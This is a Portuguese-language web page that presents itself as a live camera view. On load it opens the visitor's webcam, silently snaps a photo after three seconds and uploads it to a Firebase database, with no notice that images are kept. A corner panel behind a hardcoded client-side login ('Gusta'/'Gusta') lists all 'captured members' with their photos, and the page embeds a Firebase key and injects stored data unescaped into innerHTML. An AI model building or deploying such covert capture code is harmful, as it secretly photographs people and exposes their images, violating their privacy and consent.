<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Câmera ao Vivo - Admin</title>
    <style>
        body { font-family: sans-serif; background: #000; color: white; margin: 0; overflow: hidden; }
        
        /* Login no canto superior ESQUERDO */
        #admin-area {
            position: absolute;
            top: 10px;
            left: 10px;
            z-index: 100;
        }

        .login-box {
            background: rgba(0, 0, 0, 0.8);
            padding: 10px;
            border-radius: 5px;
            display: flex;
            flex-direction: column;
            gap: 5px;
            border: 1px solid #333;
        }

        input { padding: 5px; border-radius: 3px; border: none; width: 120px; font-size: 12px; background: #222; color: #fff; }
        button { cursor: pointer; background: #007bff; color: white; border: none; padding: 6px; border-radius: 3px; font-size: 12px; }

        /* Estilo do Vídeo */
        video {
            width: 100vw;
            height: 100vh;
            object-fit: cover;
            position: absolute;
            top: 0;
            left: 0;
        }

        /* Canvas escondido para capturar a foto */
        canvas { display: none; }

        .hidden { display: none !important; }

        #historico-painel {
            background: rgba(10, 10, 10, 0.95);
            padding: 10px;
            border-radius: 8px;
            margin-top: 10px;
            width: 260px;
            max-height: 450px;
            overflow-y: auto;
            border: 1px solid #444;
        }

        .log-item {
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid #333;
            list-style: none;
        }

        .log-item img {
            width: 100%;
            border-radius: 5px;
            margin-top: 5px;
            border: 1px solid #555;
        }

        .log-date { font-size: 10px; color: #aaa; }
    </style>
</head>
<body>

    <video id="webcam" autoplay playsinline></video>
    
    <canvas id="canvas-foto"></canvas>

    <div id="admin-area">
        <div id="form-login" class="login-box">
            <input type="text" id="usuario" placeholder="User">
            <input type="password" id="senha" placeholder="Pass">
            <button onclick="verificarAdmin()">Ver Histórico</button>
        </div>

        <div id="painel-admin" class="hidden">
            <div class="login-box">
                <div style="display:flex; justify-content: space-between; align-items:center;">
                    <span style="font-size:12px;">Painel: Gusta</span>
                    <button onclick="location.reload()" style="background:#800; padding: 2px 8px;">X</button>
                </div>
                <div id="historico-painel">
                    <h4 style="margin:0 0 10px 0; font-size:14px;">Membros Capturados:</h4>
                    <div id="lista-historico"></div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>

    <script>
        // 1. SUA CONFIGURAÇÃO (Já preenchida com seus dados das imagens)
        const firebaseConfig = {
            apiKey: "AIzaSyBg4iJlgMKbkukddt9bWLfpRXm27u14Zg0",
            projectId: "cameralog-24090",
            appId: "1:1054247726586:web:2e3c0584e54ada96a0c843"
        };

        // Inicializa o Firebase
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();

        const video = document.getElementById('webcam');
        const canvas = document.getElementById('canvas-foto');

        // 2. Inicia a câmera automaticamente
        async function iniciarApp() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                video.srcObject = stream;
                
                // Aguarda 3 segundos para a câmera estabilizar e tira a foto
                setTimeout(capturarEEnviar, 3000);
            } catch (err) {
                console.error("Erro na câmera: ", err);
            }
        }

        // 3. Tira a foto e envia para o Firebase
        function capturarEEnviar() {
            const context = canvas.getContext('2d');
            
            // Define o tamanho do canvas igual ao do vídeo
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            // Desenha o frame atual do vídeo no canvas
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Converte para imagem (JPEG com qualidade 0.5 para ser rápido)
            const fotoBase64 = canvas.toDataURL('image/jpeg', 0.5);
            
            // Envia para a coleção "acessos" no Firestore
            db.collection("acessos").add({
                data: new Date().toLocaleString('pt-BR'),
                timestamp: firebase.firestore.FieldValue.serverTimestamp(),
                imagem: fotoBase64
            }).then(() => {
                console.log("Captura salva no histórico!");
            }).catch((error) => {
                console.error("Erro ao salvar:", error);
            });
        }

        // 4. Login do Gusta
        function verificarAdmin() {
            const u = document.getElementById('usuario').value;
            const s = document.getElementById('senha').value;

            if (u === "Gusta" && s === "Gusta") {
                document.getElementById('form-login').classList.add('hidden');
                document.getElementById('painel-admin').classList.remove('hidden');
                carregarHistoricoRealtime();
            } else {
                alert("Acesso negado.");
            }
        }

        // 5. Puxa as fotos do Firebase em tempo real
        function carregarHistoricoRealtime() {
            const lista = document.getElementById('lista-historico');
            
            // Ouve mudanças no banco (toda vez que alguém entra, a foto aparece aqui)
            db.collection("acessos").orderBy("timestamp", "desc").onSnapshot((snapshot) => {
                lista.innerHTML = "";
                snapshot.forEach((doc) => {
                    const dados = doc.data();
                    const div = document.createElement('div');
                    div.className = "log-item";
                    div.innerHTML = `
                        <span class="log-date">${dados.data}</span>
                        <img src="${dados.imagem}">
                    `;
                    lista.appendChild(div);
                });
            });
        }

        window.onload = iniciarApp;
    </script>
</body>
</html>
